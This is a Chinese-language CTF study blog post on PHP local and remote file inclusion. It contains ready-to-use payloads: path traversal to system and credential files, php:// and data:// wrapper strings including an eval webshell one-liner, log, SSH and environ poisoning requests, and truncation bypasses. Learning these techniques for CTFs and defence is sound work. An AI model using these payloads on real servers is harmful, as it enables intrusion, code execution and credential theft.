---
title: 入门文件包含漏洞
published: 2026-06-02
description: 主要是 php 的
image: "./12.jpeg"
tags: ["CTF"]
category: CTF
draft: false
slug: php-include
---

前话：这个花了好长时间去进行学习和刷题，还是感觉不是很全面，后面遇到再进行补充吧（

把函数写入某个文件，在使用该函数的时候，直接调用该文件，这就叫做 **包含**

文件包含漏洞中常见函数：

php：include() 、include_once()、require()、require_once()
asp：include file、include virtual
jsp：ava.io.file()、java.io.filereader()

php 中所涉及的文件包含函数有如下 4 种：

1. include()：找不到被包含的文件时只会产生警告，脚本将继续运行
2. include_once()：与 `include()` 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含
3. require()：找不到被包含的文件时会产生致命错误，并停止脚本运行
4. require_once：与 `require()` 类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含

当以上四种函数参数可控的情况下，我们需要知道以下两点特性，

- 若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析
- 若文件内容不符合 PHP 语法规范则会暴漏其源码

也就是说，若那个文件内容满足 php，则会直接将其当作 php 来允许；若不满足 php，则直接给出其文件内容（即无视文件拓展名，无条件解析 php 代码

在文件包含中，主要分为 `本地` 和 `远程` 两种类别，分类取决于所包含文件位置的不同。这两种分类依赖于 `php.ini` 中的两个配置项，注意对配置进行更改时，注意 `On / Off` 开头需大写，其次，修改完配置文件后务必要重启 Web 服务，使其配置文件生效。

```php
allow_url_fopen （默认开启）
allow_url_include #（默认关闭，远程文件包含必须开启）
```

## 如何判断服务器类型

**读取文件**：尝试读取 `/etc/passwd`，若是成功则为 Linux，否则为 Windows（并非完全可靠

**大小写混写**：在 Linux 中严格区分大小写，在 Windows 中不区分大小写

例如：在 Windows 中尝试包含 `0n1y.txt` 和 `0n1y.TxT` 都能包含成功

## 敏感文件读取

### 绝对路径读取

#### Windows 敏感文件绝对路径

```plain
c:\boot.ini                     #查看系统版本  
c:\windows\system32\inetsrv\MetaBase.xml     #IIS配置文件  
c:\windows\repair\sam         #存储Windows的密码  
c:\programFiles\mysql\my.ini     #mysql配置文件，里面可能有密码  
c:\programFiles\mysql\data\mysql\user.MYD     #mysql root密码  
c:\windows\php.ini             #php配置文件
```

#### Linux 敏感文件绝对路径

```plain
/etc/passwd #用户账户信息
/etc/sysconfig/iptables #防火墙策略
/etc/redhat-release #系统版本
/etc/issue #系统登录提示
/etc/issue.net #网络登录提示
/etc/httpd/conf/httpd.conf #Apache默认配置文件
/usr/local/apache2/conf/httpd.conf #Apache编译安装配置文件
/usr/local/app/apache2/conf/httpd.conf #Apache自定义路径配置文件
/usr/local/app/apache2/conf/extra/httpd-vhosts.conf #Apache虚拟主机设置
/usr/local/resin-3.0.22/conf/resin.conf #Resin 3.0.22配置文件
/usr/local/resin-pro-3.0.22/conf/resin.conf #Resin Pro 3.0.22配置文件
/usr/local/app/php5/lib/php.ini #PHP相关设置
/etc/my.cnf #MySQL配置文件
/etc/rsyncd.conf #Rsync同步程序配置文件
```

### 相对路径读取

这里就是直接结合 **路径遍历** 去实现

例如：

若是我们现在在 `C:/tool/PHPTutorial/www` 下，我将要访问 `C:/windows/win.ini`

这里直接回退到 `C:`，随后再访问 `C:/windows/win.ini`

即 `../../../windows/win.ini`

（若是不知道该退几次就尽可能多退，若返回到根目录后 `../` 将保持在根目录不退了）

## php 伪协议

### file://

**条件**：
不受 allow_url_fopen 和 allow_url_include 的影响（即都可以使用
只能使用文件的绝对路径（且是从当前文件夹开始为目录

**作用**：
访问 **本地文件** 系统

**用法**：
`?file=file://文件绝对路径`

例如：
`?file=file://C:/boot.ini`

### php://input

**条件**：
需要 allow_url_include=On，对 allow_url_fopen 不做要求
当 `enctype="multipart/form-data"` php://input 是无效的
**无法使用 hackbar 提交，用抓包改提交**

**作用**：
写入木马（webshell）
命令执行

**用法**：
`?file=php://input + post包`

例如：
```plain
?file=php://input

post数据：
<?php phpinfo(); ?>
```

貌似只能使用抓包发送（我这里 hackbar 发送失败了

### php://filter

**条件**：
需要 allow_url_fopen=On，对 allow_url_include 不做要求
PHP_Version>=5.0.0

**作用**：
读取文件（多数结果以编码的形式返回）

**用法**：
```php
resource=<要过滤的数据流>    这个参数是必须的。它指定了你要筛选过滤的数据流。 resource=flag.php  
read=<读链的筛选列表>    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 php://filter/read=A|B|C/resource=flag.php  
write=<写链的筛选列表>    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 php://filter/write=A|B|C/resource=flag.php  
<；两个链的筛选列表>    任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 php://filter/A|B|C/resource=flag.php
```
`?file=php://filter/[参数+过滤器]/resource=[target_file]`

例如：
`?file=php://filter/read=convert.base64-encode/resource=flag.php`

**一些常见过滤器**：

```php
php://filter/convert.base64-encode/resource=flag.php  
php://filter/convert.quoted-printable-encode/resource=flag.php  
php://filter/string.rot13/resource=flag.php  
php://filter/string.toupper/resource=flag.php  
php://filter/string.tolower/resource=flag.php  
php://filter/string.strip_tags/resource=flag.php
php://filter/convert.iconv.UTF8.UTF16/resource=flag.php
```

### data://

**条件**：
allow_url_include 和 allow_url_fopen 都要为 On
php 版本 >= 5.2.0

**作用**：
和 `php://input` 类似，都可以执行任意命令

**用法**：
`?file=data://text/plain,<?php 执行内容 ?>`
`?file=data://text/plain;base64,编码后的php代码`

注：经过 base64 后的加号要手动的进行 url 编码，以免浏览器识别不了

例如：
```php
data://text/plain,<?php phpinfo();?>  
data://text/plain,<?php eval($_POST['helloctf']);?>  

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+  
data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2hlbGxvY3RmJ10pOz8+  
  
data:text/plain
```
### zip:// & bzip2:// & zlib://

**条件**：
php 版本 >= 5.3.0
使用文件的绝对路径
`#` 要在浏览器中编码为 `%23`
都支持任意后缀名，只要是按照支持的格式压缩后随便改都可

**作用**：
访问压缩文件中的文件
`zip://` 对应 `.zip`
`bzip2://` 对应 `.bz2`
`zlib://` 对应 `.gz`
这里都是说的压缩方式，而非后缀名

**用法**：
`?file=zip://[压缩文件路径]#[压缩文件内的子文件名]`

例如：
`zip://flag.zip#flag.php`

### phar://

**条件**：
php 版本 >= 5.3.0
（使用相对路径也可以，若是当前目录）

这里压缩包必须得是使用 zip 格式压缩而成的，使用 rar，7z 等就不行
并且压缩后可以随便修改后缀名
比如 `0n1y.zip` 改为 `0n1y.666`，这里都是可以被正常解析的

**用法**：
`?file=phar://[压缩文件路径]/[压缩文件内的子文件名]`

例如：
`?file=phar://test.zip/phpinfo.txt //相对`
`?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt //绝对`

## 绕过方式

### 本地文件包含绕过

#### %00 截断绕过

和文件上传类似，

#### 超长字符绕过

**PHP 版本 < 5.3.8**

操作系统对目录有最大长度的限制

在 Windows 中，目录长度不可以超过 256 字节

在 Linux 中，目录长度不可以超过 4096 字节

超出上述部分的将会被丢弃

可以使用 `././././././././././././././././.` 进行绕过

单独对于 Windows 来说，还可以使用 `..........................` 去进行绕过

### 远程文件包含绕过

#### %00 截断绕过

使用条件：
php 版本在 5.3 以下
`magic_quotes_gpc = off;`

和文件上传类似

#### 超长字符绕过

貌似只能使用 `./` 去进行绕过

linux 是 4096 长度；Windows 是 256 长度

#### ?绕过

在文件名后加上 `?`

#### `#`绕过

在文件名后加上 `#`

## 文件包含之日志文件

**条件**：
需要知道服务器日志的存储路径，且日志文件可读

这里注意，我们传入的一句话木马可能都是编码过后的，要在 burpsuite 中修改后再传
### Apache

apache 存在两个文件日志文件，access.log 是记录登录等信息的日志文件，而 error.log是错误文件

```php
Windows系统：
apache安装目录/logs/access.log或者error.log  

Linux系统：  
/var/log/apache/access.log或者error.log  
/var/log/apache2/access.log或者error.log  
/etc/httpd/logs/access_log或者error.log
```

我们可以先尝试该路径是否可以访问

若是可行，则可先看日志是记录什么信息（一般是 ua；例如，若是日志记录了每次网络请求的 ua 信息，则我们可以尝试在 ua 里面进行注入

### Nginx

nginx 存在两个文件日志文件，access.log 是记录登录等信息的日志文件，而 error.log 是错误文件

```php
Windows系统：  
nginx安装目录/logs/access.log或者error.log  

Linux系统：  
/var/log/nginx/access.log或者error.log
```

同 apache

### IIS

```php
iis6.0版本  
C:\windows\system32\LogFiles  

iis7.5版本  
%SystemDrive%\inetpub\logs\LogFiles
```

## 文件包含之 session

**条件**：
session 文件路径已知，且其中内容部分可控

php 的 session 可以用 phpinfo() 看到，在 `session.save_path`

这里第二列是局部变量，第三列是全局变量，若是都有值的情况下看局部变量（这个好像我在文件上传里面也写了）

注：若是该值为 `no value`，则大概就是其操作系统的默认位置
Linux 的是 `/tmp/sess_PHPSESSID`

session 的文件名格式为`sess_[phpsessid]`，而 phpsessid 在发送的请求的 cookie 字段中可以看到


常见的 php-session 的位置：

```plain
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

## 文件包含之 SSH

**条件**：
需要知道 ssh-log 的位置，且可读。默认情况下为 `/var/log/auth.log`

使用 `ssh -pssh端口 '<?php phpinfo(); ?>'@ip地址` 将恶意代码注入日志中，然后可包含该日志文件

## 文件包含之运行环境

**条件**：
php 以 CGI 方式运行，这样 environ 才会保持 UA 头
environ 文件存储位置已知且environ文件可读 `/proc/self/environ`

例如：

```php
GET /index.php?file=../../../../proc/self/environ HTTP/1.1 
Host: 127.0.0.1 
User-Agent: Mozilla/5.0 <?phpinfo();?> 
Connection: close
```

## 文件包含之临时文件

php 中上传文件，会创建临时文件。在 `linux` 下使用 `/tmp` 目录，而在 `windows` 下使用 `c:\winsdows\temp` 目录。在临时文件被删除之前，利用竞争即可包含该临时文件

由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而 Windows 下只有 65535 中不同的文件名，所以这个方法是可行的

另一种方法是配合phpinfo页面的 php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可

exp：
`https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py`
## 文件包含之 fd

目录为 `/proc/*/fd/`

该目录 `/proc/*` 中的 `*` 代表的是进程号 (PID) ，而 `/proc/*/fd` 下的文件才是我们真正要包含的文件

我们可以尝试将一句话写进 `referer` 头后然后尝试包含

参考：https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method